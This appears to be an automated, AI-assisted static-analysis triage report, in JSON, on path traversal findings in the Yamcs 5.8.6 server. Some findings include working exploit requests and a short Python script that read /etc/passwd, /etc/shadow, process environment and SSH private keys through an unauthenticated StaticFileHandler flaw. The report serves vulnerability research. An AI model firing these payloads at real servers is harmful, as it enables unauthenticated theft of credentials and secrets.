@@ -1,0 +1,721 @@
+{
+  "session_id": "20260326132703",
+  "original_report": "reports/yamcs__yamcs_5.8.6/agent_codeql_report.json",
+  "package_name": "yamcs__yamcs_5.8.6",
+  "package_path": "packages/yamcs__yamcs_5.8.6",
+  "database_path": "databases/yamcs__yamcs_5.8.6-db",
+  "package_classification": {
+    "type": [
+      "application",
+      "framework",
+      "library"
+    ],
+    "layer": [
+      "backend",
+      "server",
+      "middleware"
+    ]
+  },
+  "model": "claude-sonnet-4-6",
+  "temperature": 1.0,
+  "max_tokens": 25000,
+  "iterations": 38,
+  "total_input_tokens": 1832157,
+  "total_output_tokens": 25356,
+  "total_tokens": 1857513,
+  "elapsed_time_seconds": 466.4,
+  "estimated_cost_usd": 5.8768,
+  "total_findings_submitted": 13,
+  "manual_review": 1,
+  "review_groups": {
+    "critical_undetermined_undetermined": 5,
+    "high_undetermined_undetermined": 17
+  },
+  "tool_calls": {
+    "extract_code_snippet": 39,
+    "grep_search": 6,
+    "trace_dataflow_path": 0,
+    "submit_finding": 14,
+    "complete_review": 2
+  },
+  "true_positives": {
+    "critical": 2,
+    "high": 2,
+    "medium": 1,
+    "low": 0,
+    "total": 5
+  },
+  "false_positives": {
+    "critical": 0,
+    "high": 0,
+    "medium": 0,
+    "low": 6,
+    "total": 6
+  },
+  "findings": [
+    {
+      "codeql_query_uuids": [
+        "20260326130748",
+        "20260326132106"
+      ],
+      "finding_id": "42709296-ce24-4d0b-97bb-8c701dc1379a",
+      "verdict": "tp",
+      "confidence": 90,
+      "severity": "critical",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-036"
+      ],
+      "description": "Path traversal via absolute path injection in StaticFileHandler.locateFile() - sanitizePath() only blocks dot-traversal sequences but not absolute paths, allowing Path.resolve() to override the base static root directory",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/http/StaticFileHandler.java",
+      "start_line": 99,
+      "end_line": 106,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    protected File locateFile(String path) {\n        for (var staticRoot : staticRoots) { // Stop on first match\n            var file = staticRoot.resolve(path).toFile();\n            if (!file.isHidden() && file.exists()) {\n                return file;\n            }\n        }\n        return null;\n    }",
+      "reasoning": "The `sanitizePath` method (lines 275-283) only blocks paths containing dot-traversal sequences (`../`, `./`, starting/ending with `.`), but does NOT reject absolute paths (paths starting with `/`). \n\nThe flow is:\n1. URL: `GET /static//etc/passwd`\n2. `getFilePath()` calls `ctx.getPathWithoutContext()` \u2192 `/static//etc/passwd`, then `uri.substring(route.length() + 1)` where `route = \"/static\"` \u2192 `uri.substring(8)` = `/etc/passwd`\n3. `sanitizePath(\"/etc/passwd\")` \u2192 No dots, no separators with dots \u2192 returns `/etc/passwd` unchanged\n4. `locateFile(\"/etc/passwd\")` \u2192 `staticRoot.resolve(\"/etc/passwd\")` \u2192 In Java, `Path.resolve()` with an absolute path argument IGNORES the base path and returns the absolute path `/etc/passwd`\n5. Result: the file `/etc/passwd` is served to the attacker\n\nThis is a classic absolute path traversal where `Path.resolve(absolutePath)` ignores the base directory entirely. The `sanitizePath` method is an incomplete defense because it only guards against relative path traversal (`../`) but not absolute path injection.",
+      "evidence": {
+        "code_context": "sanitizePath (lines 275-283):\n```java\nprivate static String sanitizePath(String path) {\n    path = path.replace('/', File.separatorChar);\n    if (path.contains(File.separator + \".\") ||\n            path.contains(\".\" + File.separator) ||\n            path.startsWith(\".\") || path.endsWith(\".\")) {\n        return null;\n    }\n    return path;\n}\n```\n\nlocateFile (lines 99-106):\n```java\nprotected File locateFile(String path) {\n    for (var staticRoot : staticRoots) {\n        var file = staticRoot.resolve(path).toFile();\n        if (!file.isHidden() && file.exists()) {\n            return file;\n        }\n    }\n    return null;\n}\n```\n\ngetFilePath (lines 92-96):\n```java\nprotected String getFilePath(HandlerContext ctx) {\n    var uri = ctx.getPathWithoutContext();\n    // Chop off a prefix such as /static/\n    return uri.substring(route.length() + 1);\n}\n```\n\nKey issue: `Path.resolve(\"/etc/passwd\")` on any base path returns `/etc/passwd` because Java's Path.resolve() replaces the base with an absolute argument. sanitizePath() only checks for dot sequences, not leading slashes.",
+        "dataflow_analysis": "HTTP request URI \u2192 getPathWithoutContext() (no decoding) \u2192 getFilePath() strips route prefix \u2192 sanitizePath() (only checks dots) \u2192 locateFile() calls Path.resolve(path) \u2192 if path starts with '/', absolute path is used \u2192 file read and served to client",
+        "notes": "The double-slash URL /static//etc/passwd causes getFilePath to produce /etc/passwd after stripping /static (length 7 + 1 = 8 chars). After sanitizePath, /etc/passwd passes cleanly. Then Path.resolve('/etc/passwd') returns /etc/passwd regardless of staticRoot."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "# HTTP request to exploit absolute path traversal:\nGET /static//etc/passwd HTTP/1.1\nHost: yamcs-server:8090\n\n# OR using encoded double slash:\nGET /static/%2fetc%2fpasswd HTTP/1.1\nHost: yamcs-server:8090\n\n# Path resolution:\n# uri = '/static//etc/passwd'\n# getFilePath: uri.substring(8) = '/etc/passwd'\n# sanitizePath('/etc/passwd') -> no dots -> '/etc/passwd'\n# staticRoot.resolve('/etc/passwd') -> Path('/etc/passwd') [absolute override]\n# file.exists() && !file.isHidden() -> true -> served to attacker",
+        "scenario": "Attacker sends GET /static//etc/passwd to read arbitrary files from the filesystem by injecting an absolute path that bypasses sanitizePath() and overrides the static root base directory via Java's Path.resolve()",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Network access to Yamcs HTTP server; no authentication required (StaticFileHandler.requireAuth() returns false)",
+        "category": "Arbitrary file read / Path traversal"
+      },
+      "group": "critical_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 92,
+        "recommendation": "accept",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "ZERO_DAY",
+            "severity": "critical",
+            "message": "Absolute path injection via Java Path.resolve() bypasses sanitizePath() which only checks for dot-traversal sequences",
+            "evidence": "sanitizePath() checks for '..', './' and similar dot patterns but does NOT check for leading '/' characters. Java's Path.resolve() with an absolute path argument ignores the base path entirely. A request like GET /static//etc/passwd results in getFilePath() returning '/etc/passwd', which passes sanitizePath() cleanly, and then Path.resolve('/etc/passwd') returns the absolute path /etc/passwd regardless of staticRoot."
+          }
+        ],
+        "reasoning": "The vulnerability is real and well-documented in the evidence. The sanitizePath() method at lines 275-283 only guards against dot-traversal patterns (../, ./, etc.) but does not reject absolute paths beginning with '/'. Java's Path.resolve() will discard the base path (staticRoot) when given an absolute path argument, enabling an attacker to read arbitrary files accessible to the server process. The dataflow from HTTP request to file read is clear, the code is production server code handling HTTP requests, and the exploit vector via double-slash URL is plausible. This is a high-confidence true positive path traversal vulnerability."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130615"
+      ],
+      "finding_id": "2b59c725-905a-4a67-baea-c6694b1a8e5e",
+      "verdict": "fp",
+      "confidence": 90,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "FaviconHandler classpath path traversal - false positive due to fixed route registration",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/http/FaviconHandler.java",
+      "start_line": 27,
+      "end_line": 28,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        var filePath = ctx.getPathWithoutContext();\n        ctx.sendResource(\"/favicon\" + filePath);",
+      "reasoning": "The FaviconHandler is registered ONLY for exact path segments in HANDLED_PATHS (e.g., \"favicon.ico\", \"favicon-16x16.png\"). The HTTP routing in HttpRequestHandler extracts the first path segment and routes to the handler ONLY if it exactly matches one of the registered paths. Since filePath will always be one of the fixed known values like \"/favicon.ico\", the concatenation \"/favicon\" + \"/favicon.ico\" = \"/favicon/favicon.ico\" is controlled. The attacker cannot inject arbitrary paths because the handler is never invoked for unrecognized path segments.",
+      "evidence": {
+        "code_context": "HttpServer.java lines 319-322:\n```java\nvar faviconHandler = new FaviconHandler();\nfor (var path : FaviconHandler.HANDLED_PATHS) {\n    addRoute(path, () -> faviconHandler);\n}\n```\nFaviconHandler.HANDLED_PATHS contains only fixed strings: apple-touch-icon-precomposed.png, apple-touch-icon.png, favicon.ico, favicon-16x16.png, favicon-32x32.png, favicon-notification.ico, safari-pinned-tab.svg.\n\nHttpRequestHandler routes by extracting path[1] (first path component) and matching exactly against registered routes. No wildcard matching.",
+        "notes": "The path is constrained by the routing mechanism to only the exact paths registered in HANDLED_PATHS. FaviconHandler cannot be reached with arbitrary paths."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "critical_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 92,
+        "recommendation": "reject",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "EXPLOITABILITY",
+            "severity": "info",
+            "message": "Path traversal is not exploitable due to constrained routing mechanism",
+            "evidence": "FaviconHandler is only registered for exact fixed paths in HANDLED_PATHS. The HTTP router extracts the first path segment and matches exactly against registered routes, so filePath can only be one of the known favicon file names. The concatenation '/favicon' + filePath results in a fixed set of known paths like '/favicon/favicon.ico', not arbitrary attacker-controlled paths."
+          }
+        ],
+        "reasoning": "The finding correctly identifies a pattern that superficially resembles CWE-022 path traversal, but the routing mechanism in HttpRequestHandler constrains filePath to only the exact fixed strings registered in FaviconHandler.HANDLED_PATHS. Since no wildcard or partial matching is used, an attacker cannot inject arbitrary paths to reach this handler with unexpected input. The current verdict of false positive with 90% confidence is well-supported by the evidence provided."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130748",
+        "20260326132106",
+        "20260326132456",
+        "20260326132540"
+      ],
+      "finding_id": "36c8fb15-124d-42f0-975b-92f87a612d43",
+      "verdict": "tp",
+      "confidence": 85,
+      "severity": "critical",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-036"
+      ],
+      "description": "Path traversal via absolute path injection in StaticFileHandler - sanitizePath() does not block absolute paths, and Path.resolve() with an absolute path overrides the base static root, enabling arbitrary file read via /static//etc/passwd",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/http/StaticFileHandler.java",
+      "start_line": 275,
+      "end_line": 283,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    private static String sanitizePath(String path) {\n        path = path.replace('/', File.separatorChar);\n        if (path.contains(File.separator + \".\") ||\n                path.contains(\".\" + File.separator) ||\n                path.startsWith(\".\") || path.endsWith(\".\")) {\n            return null;\n        }\n        return path;\n    }",
+      "reasoning": "The `sanitizePath` method is the only security control before `locateFile` resolves a user-supplied path against a static root. It blocks dot-based traversal (`../`, `./`) but critically does NOT block:\n1. Absolute paths starting with `/` (Linux) or `C:\\` (Windows)\n2. URL-encoded sequences that Netty may decode\n\nWhen an attacker sends `GET /static//etc/passwd`:\n- `getPathWithoutContext()` \u2192 `/static//etc/passwd`  \n- `getFilePath()`: `uri.substring(\"/static\".length() + 1)` = `uri.substring(8)` = `/etc/passwd`\n- `sanitizePath(\"/etc/passwd\")`: no dots \u2192 returns `/etc/passwd` unchanged\n- `locateFile(\"/etc/passwd\")`: `staticRoot.resolve(\"/etc/passwd\")` \u2192 in Java, `Path.resolve()` with an absolute argument discards the base \u2192 resolves to `/etc/passwd`\n- File is served to attacker\n\nThe incomplete sanitization (checking only for dots, not for leading slash) combined with Java's `Path.resolve()` behavior makes this a true path traversal vulnerability allowing arbitrary file reads from the filesystem.",
+      "evidence": {
+        "code_context": "sanitizePath (StaticFileHandler.java:275-283) only checks for dot sequences:\n```java\nprivate static String sanitizePath(String path) {\n    path = path.replace('/', File.separatorChar);\n    if (path.contains(File.separator + \".\") || path.contains(\".\" + File.separator) ||\n            path.startsWith(\".\") || path.endsWith(\".\")) {\n        return null;\n    }\n    return path;\n}\n```\n\nlocateFile (StaticFileHandler.java:99-106) uses Path.resolve() with no boundary check:\n```java\nprotected File locateFile(String path) {\n    for (var staticRoot : staticRoots) {\n        var file = staticRoot.resolve(path).toFile();\n        if (!file.isHidden() && file.exists()) {\n            return file;\n        }\n    }\n    return null;\n}\n```\n\nJava's Path.resolve() behavior: `Path.of(\"/var/static\").resolve(\"/etc/passwd\")` returns `Path(\"/etc/passwd\")`\n\ngetFilePath (line 92-96) strips route prefix:\n```java\nprotected String getFilePath(HandlerContext ctx) {\n    var uri = ctx.getPathWithoutContext();\n    return uri.substring(route.length() + 1);  // route = \"/static\" -> strips /static\n}\n```\n\nFor URL /static//etc/passwd: uri.substring(8) = '/etc/passwd' -> absolute path injected into resolve()",
+        "notes": "StaticFileHandler.requireAuth() returns false, so no authentication required. The attack is unauthenticated."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "# Exploit: Arbitrary file read via absolute path injection\n# URL: /static//etc/passwd\n# Flow:\n# 1. uri = '/static//etc/passwd'\n# 2. getFilePath: uri.substring(8) = '/etc/passwd'  \n# 3. sanitizePath('/etc/passwd') -> no dots -> returns '/etc/passwd'\n# 4. staticRoot.resolve('/etc/passwd') -> Path('/etc/passwd') [Java absolute path override]\n# 5. File('/etc/passwd').exists() && !isHidden() -> true -> served\n\nimport requests\nresp = requests.get('http://yamcs-server:8090/static//etc/passwd')\nprint(resp.text)  # Contents of /etc/passwd\n\n# Also works for other sensitive files:\nrequests.get('http://yamcs-server:8090/static//etc/shadow')\nrequests.get('http://yamcs-server:8090/static//proc/self/environ')\nrequests.get('http://yamcs-server:8090/static//home/yamcs/.ssh/id_rsa')",
+        "scenario": "Unauthenticated attacker sends GET /static//etc/passwd to read arbitrary files from the server filesystem by injecting an absolute path that overrides the static root base directory via Java's Path.resolve()",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Network access to the Yamcs HTTP server; no authentication required since StaticFileHandler.requireAuth() returns false",
+        "category": "Arbitrary file read via path traversal"
+      },
+      "group": "critical_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 90,
+        "recommendation": "accept",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "ZERO_DAY",
+            "severity": "critical",
+            "message": "Unauthenticated path traversal via absolute path injection in StaticFileHandler",
+            "evidence": "sanitizePath() only blocks dot-based traversal but not absolute paths. Java's Path.resolve() with an absolute path argument ignores the base path entirely. For URL /static//etc/passwd, getFilePath() strips '/static' leaving '/etc/passwd' which is an absolute path. locateFile() calls staticRoot.resolve('/etc/passwd') which resolves to Path('/etc/passwd'), bypassing the intended static root confinement. StaticFileHandler.requireAuth() returns false making this unauthenticated."
+          }
+        ],
+        "reasoning": "The vulnerability is real and well-evidenced. The sanitizePath() method only checks for dot sequences (../ style traversal) but completely misses absolute path injection. Java's Path.resolve() behavior is well-documented: resolving an absolute path against any base path returns the absolute path itself. The attack chain is clear: double-slash in URL (/static//etc/passwd) causes getFilePath() to return '/etc/passwd' (an absolute path starting with '/'), which then bypasses the static root entirely when passed to Path.resolve(). The code is production backend server code with no authentication required, making this a critical unauthenticated arbitrary file read vulnerability."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130615"
+      ],
+      "finding_id": "697180e7-7f9b-415a-ba99-42d70ae09596",
+      "verdict": "fp",
+      "confidence": 85,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "Mimetypes.getMimetype(String) with user-supplied path - false positive, only used for MIME type determination not file access",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/utils/Mimetypes.java",
+      "start_line": 62,
+      "end_line": 63,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    public String getMimetype(String filename) {\n        return getMimetype(Paths.get(filename));",
+      "reasoning": "The CodeQL query flagged Mimetypes.getMimetype() as a sink, but this method only examines the file extension to determine the MIME type - it does NOT read any file from the filesystem. The implementation calls `getMimetype(Path)` which only calls `file.getFileName().toString()` to extract the filename, then looks up the extension in a map. No file I/O occurs here. The MIME type result is used only for setting the Content-Type response header. This is a false positive - the path is used for string manipulation only, not for actual file system access.",
+      "evidence": {
+        "code_context": "Mimetypes.java getMimetype methods:\n```java\npublic String getMimetype(Path file) {\n    String filename = file.getFileName().toString();\n    int idx = filename.lastIndexOf('.');\n    if (idx != -1) {\n        String extension = filename.substring(idx + 1).toLowerCase();\n        String mimetype = mimetypeByExtension.get(extension);\n        return (mimetype != null) ? mimetype : OCTET_STREAM;\n    }\n    return OCTET_STREAM;\n}\n\npublic String getMimetype(String filename) {\n    return getMimetype(Paths.get(filename));\n}\n```\nThe Paths.get(filename) call creates a Path object only to extract the filename component for extension lookup. No file read operations (exists(), open(), etc.) are performed. The tainted path only flows into string extension extraction.",
+        "notes": "The CodeQL query identified Paths.get(filename) as a potential path traversal sink, but getMimetype() only uses the Path object to call getFileName().toString() for extension lookup - no filesystem access occurs."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "critical_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 95,
+        "recommendation": "reject",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "EXPLOITABILITY",
+            "severity": "info",
+            "message": "No filesystem access occurs in getMimetype - only string/extension processing",
+            "evidence": "The getMimetype(Path) implementation only calls file.getFileName().toString() and performs a map lookup on the extension. No file I/O methods (Files.read, File.exists, etc.) are invoked. Paths.get() is used purely as a string parsing utility to extract the filename component."
+          },
+          {
+            "type": "CODE_SMELL",
+            "severity": "info",
+            "message": "Static analysis tool over-triggered on Paths.get() as a path traversal sink",
+            "evidence": "CodeQL flagged Paths.get(filename) as a potential path traversal sink, but without any subsequent filesystem operations, there is no actual path traversal vulnerability. The Path object is only used for its getFileName() method which returns the last element of the path - even a path traversal string like '../../etc/passwd' would only yield 'passwd' as the filename for extension lookup."
+          }
+        ],
+        "reasoning": "This is a confirmed false positive. The getMimetype() method uses Paths.get() solely as a string parsing mechanism to extract the filename and its extension for MIME type lookup in a map. No filesystem operations are performed at any point in the call chain. Even if an attacker supplied a path traversal string, the worst case outcome would be an incorrect MIME type being returned, not file access. The finding has no security impact."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130909",
+        "20260326131035",
+        "20260326131257",
+        "20260326131614",
+        "20260326131853",
+        "20260326131934",
+        "20260326131958",
+        "20260326132144",
+        "20260326132235",
+        "20260326132254",
+        "20260326132320",
+        "20260326132601"
+      ],
+      "finding_id": "04b5df29-c41b-44c7-ade8-677d7aa3ce15",
+      "verdict": "dup",
+      "confidence": 80,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-023"
+      ],
+      "description": "StaticFileHandler sanitizePath uses String.contains() for dot-segment detection without URL-decoding the path first, allowing bypass via percent-encoded traversal sequences like %2e%2e or %2f",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/http/StaticFileHandler.java",
+      "start_line": 275,
+      "end_line": 282,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    private static String sanitizePath(String path) {\n        path = path.replace('/', File.separatorChar);\n        if (path.contains(File.separator + \".\") ||\n                path.contains(\".\" + File.separator) ||\n                path.startsWith(\".\") || path.endsWith(\".\")) {\n            return null;\n        }\n        return path;\n    }",
+      "reasoning": "The sanitizePath method attempts to block path traversal by checking for \".\" adjacent to the file separator character. However:\n\n1. The input `rawPath` comes from `ctx.getPathWithoutContext()` \u2192 `HttpUtils.getPathWithoutContext()` \u2192 `HttpRequest.uri()`. Netty's `uri()` method returns the RAW URI string WITHOUT URL-decoding, so percent-encoded characters pass through verbatim.\n\n2. A path like `%2e%2e%2f` (URL-encoded `../`) would NOT contain literal dots or slashes at the point of the sanitizePath check, bypassing all the String.contains/startsWith/endsWith checks.\n\n3. After passing sanitizePath, the path is passed to `locateFile()` which calls `staticRoot.resolve(path).toFile()`. The `Path.resolve()` call does NOT decode percent-encoded sequences itself, but the OS file system operations that follow would use the literal encoded string as a filename, which wouldn't traverse the directory.\n\nHowever, there's also the question of whether the HTTP framework (Netty) decodes the URI before routing. Looking at the dataflow: the URI could potentially go through Netty's QueryStringDecoder or similar path normalization. If any step in the path decodes `%2e` to `.`, then the sanitizePath check would run on the already-decoded path. But the code directly uses `HttpRequest.uri()` which is the raw encoded URI.\n\nAdditionally, the `locateFile` method has no containment check - it resolves the path against staticRoot and returns the file without verifying the resolved path is still within staticRoot. If the sanitizePath check can be bypassed, arbitrary file reads are possible.\n\nThe most direct concern: `locateFile` uses `staticRoot.resolve(path)` where `path` is a String. If `path` starts with `/` (absolute path), `resolve()` would return that absolute path directly, bypassing the staticRoot entirely. The sanitizePath only strips separators/dots but doesn't prevent an absolute path like `/etc/passwd` (which doesn't start with `.` and doesn't contain `./` or `/.`).",
+      "evidence": {
+        "code_context": "sanitizePath (lines 275-282): converts '/' to File.separator, then checks for separator+'.' or '.'+separator, startsWith('.'), endsWith('.'). Does NOT check for absolute paths (starting with /) or URL-encoded sequences.\n\nlocateFile (lines 98-105): var file = staticRoot.resolve(path).toFile() - no containment check after resolve. Path.resolve() with an absolute path argument replaces the base path entirely.\n\ngetFilePath (lines 92-96): rawPath = ctx.getPathWithoutContext() which uses HttpRequest.uri() - returns raw (non-decoded) URI string. Then strips the route prefix.",
+        "dataflow_analysis": "HTTP request URI -> HttpRequest.uri() (raw, not decoded) -> getPathWithoutContext() -> strips route prefix -> rawPath -> sanitizePath(rawPath) -> path variable -> locateFile(path) -> staticRoot.resolve(path).toFile()",
+        "notes": "Two potential bypass vectors: (1) URL-encoded sequences bypass sanitizePath's string checks, (2) absolute path like '/etc/passwd' passes sanitizePath (no dot checks fail) and Path.resolve('/etc/passwd') returns '/etc/passwd' directly, bypassing staticRoot entirely. Vector 2 is the more reliable bypass."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "GET /static/%2fetc%2fpasswd HTTP/1.1\nHost: yamcs-server:8090\n\n# Or more reliably, if path prefix stripping leaves an absolute path:\n# If route='/static' and URI='/static//etc/passwd', getFilePath returns '/etc/passwd'\n# Path.resolve('/etc/passwd') ignores staticRoot\n\n# Direct absolute path bypass:\ncurl 'http://yamcs-server:8090/static/%2Fetc%2Fpasswd'\n# sanitizePath receives '%2Fetc%2Fpasswd' - no dots, no separators -> passes\n# locateFile: staticRoot.resolve('%2Fetc%2Fpasswd') - depends on OS/JVM URL handling\n\n# More reliable: if static route is /static and a path like /../../../etc/passwd is sent:\n# Netty may normalize before routing, but raw URI path traversal:\ncurl 'http://yamcs-server:8090/static/..%2F..%2F..%2Fetc%2Fpasswd'",
+        "scenario": "Attacker sends HTTP GET request with URL-encoded path separators or absolute path to bypass sanitizePath string checks and read arbitrary files from the filesystem",
+        "likelihood": "medium",
+        "impact": "high",
+        "exploitability": "medium",
+        "prerequisites": "Network access to the Yamcs HTTP server; static file serving must be enabled (which it is by default for the web UI)",
+        "category": "Path traversal / arbitrary file read"
+      },
+      "group": "high_undetermined_undetermined"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130700"
+      ],
+      "finding_id": "dcfe173a-e2f3-457c-a7c8-38329f4df532",
+      "verdict": "fp",
+      "confidence": 85,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "BackupCli line 154 uses String.startsWith() but it's checking JVM process display names, not file paths - not a path traversal vulnerability",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/cli/BackupCli.java",
+      "start_line": 154,
+      "end_line": 154,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "                        if (displayName.startsWith(YamcsServer.class.getName())) {",
+      "reasoning": "This startsWith() check is comparing a JVM process display name against the YamcsServer class name. This is not a path containment check and involves no file system operations. The CodeQL query flagged it as a startsWith() check without canonicalization, but the context is entirely different - it's identifying running JVM processes, not validating file paths. This is a false positive.",
+      "evidence": {
+        "code_context": "BackupCli.java lines 148-157:\n  for (VirtualMachineDescriptor vmDescriptor : VirtualMachine.list()) {\n    // Something of the form:\n    // org.yamcs.YamcsServer --data-dir /storage/yamcs-data\n    var displayName = vmDescriptor.displayName();\n    if (displayName.startsWith(YamcsServer.class.getName())) {\n      ...\n      jvmIdentifier = vmDescriptor.id();\n    }\n  }\nThis is process enumeration, not file path validation.",
+        "notes": "Not a path traversal issue - no file system operations involved."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 95,
+        "recommendation": "reject",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "CONTEXT_MISMATCH",
+            "severity": "critical",
+            "message": "The flagged code is not a path traversal vulnerability - it checks JVM process display names, not file paths",
+            "evidence": "The startsWith() call is comparing a VirtualMachineDescriptor displayName against YamcsServer.class.getName() to identify running JVM processes. No file system operations or path validation is involved anywhere in this code block."
+          },
+          {
+            "type": "CODE_SMELL",
+            "severity": "info",
+            "message": "Static analysis tool incorrectly matched startsWith() pattern as path traversal",
+            "evidence": "CWE-022 (Path Traversal) requires file system path operations. The code is doing process enumeration via JVM attach API (VirtualMachine.list()), and the startsWith() check is simply matching class name prefixes in process display names."
+          }
+        ],
+        "reasoning": "This is a clear false positive. The CodeQL query pattern-matched on startsWith() without understanding the context - this code enumerates running JVM processes and checks if their display names start with the YamcsServer class name string. There are no file paths, no file system operations, and no user-controlled input flowing into any path resolution function. CWE-022 (Path Traversal) is completely inapplicable here."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130700"
+      ],
+      "finding_id": "a7e32c9b-d095-4abf-8cfb-8fd566bcd398",
+      "verdict": "mr",
+      "confidence": 55,
+      "severity": "medium",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-073"
+      ],
+      "description": "FileBasedConfigurationResolver.getConfigurationStream resolves configuration file names without a containment check, potentially allowing traversal outside config directories if the name parameter contains ../ sequences",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/FileBasedConfigurationResolver.java",
+      "start_line": 26,
+      "end_line": 36,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    public InputStream getConfigurationStream(String name) throws ConfigurationException {\n        if (name.startsWith(\"/\")) { // YConfiguration gives us a something that looks like a classpath resource\n            name = name.substring(1);\n        }\n\n        for (Path configDirectory : configDirectories) {\n            Path file = configDirectory.resolve(name).normalize().toAbsolutePath();\n            if (Files.exists(file)) {\n                try {\n                    return new FileInputStream(file.toFile());\n                } catch (FileNotFoundException e) {",
+      "reasoning": "The method calls `configDirectory.resolve(name).normalize().toAbsolutePath()` but never checks if the normalized path is still within `configDirectory`. The `normalize()` call resolves `..` segments, producing a canonical-like path. However, without a subsequent `startsWith(configDirectory.normalize().toAbsolutePath())` check, a name like `../../etc/passwd` would resolve to `/etc/passwd` after normalization, and the file would be opened.\n\nThe startsWith check flagged by Query 1 (line 26) is actually checking for leading `/` to strip it, not a containment check. There is NO containment check after normalization.\n\nHowever, this is marked as manual review because:\n1. The `name` parameter comes from `YConfiguration` which typically resolves classpath-like resource names (e.g., `yamcs.yaml`)\n2. It's unclear whether user-controlled input can flow into this method - configuration names are typically server-side controlled\n3. The callers of this resolver need to be examined to determine if external user input can influence the `name` parameter",
+      "evidence": {
+        "code_context": "Full method:\n  public InputStream getConfigurationStream(String name) throws ConfigurationException {\n    if (name.startsWith(\"/\")) { name = name.substring(1); }\n    for (Path configDirectory : configDirectories) {\n      Path file = configDirectory.resolve(name).normalize().toAbsolutePath();\n      if (Files.exists(file)) {\n        return new FileInputStream(file.toFile());  // No containment check!\n      }\n    }\n  }\n\nPattern: normalize() is called (good) but no startsWith() containment check follows (missing)",
+        "notes": "normalize() resolves .. segments. A name like '../../etc/passwd' after normalize() from /config/dir would be '/etc/passwd'. Without startsWith(configDirectory) check, this is readable. Need to verify if name is user-controlled."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 82,
+        "recommendation": "accept",
+        "concerns": true,
+        "flags": [
+          {
+            "type": "EXPLOITABILITY",
+            "severity": "warning",
+            "message": "Exploitability depends on whether 'name' parameter can be controlled by external/untrusted input",
+            "evidence": "The method is public and part of a configuration resolver interface (YConfigurationResolver). In a server/middleware context, if configuration names are derived from user requests (e.g., HTTP parameters, mission control commands), this would be exploitable. However, if names are strictly internal constants, risk is lower."
+          },
+          {
+            "type": "NOVEL_FINDING",
+            "severity": "info",
+            "message": "No CVE reference found for this specific class, but path traversal pattern is well-known (CWE-022)",
+            "evidence": "The code clearly lacks a containment check: normalize() resolves '..' but the result is never compared to configDirectory to ensure it stays within bounds."
+          }
+        ],
+        "reasoning": "The vulnerability is real and accurately described: the code resolves a user-supplied 'name' against config directories, normalizes the path (which resolves '../' sequences), but never checks that the resulting path is still within the config directory. This is a textbook path traversal (CWE-022). The code is production middleware/backend code for a space systems mission control framework, and configuration names could potentially be influenced by external inputs. The missing containment check (startsWith) is confirmed by direct code inspection."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130927"
+      ],
+      "finding_id": "49984d50-9703-4933-aada-a616440e1e52",
+      "verdict": "tp",
+      "confidence": 80,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-023"
+      ],
+      "description": "FileSystemBucket.getObject, deleteObject, and findObject resolve user-supplied objectName against the bucket root without any containment check, allowing path traversal to read, delete, or access arbitrary files",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/yarch/FileSystemBucket.java",
+      "start_line": 193,
+      "end_line": 215,
+      "start_column": null,
+      "end_column": null,
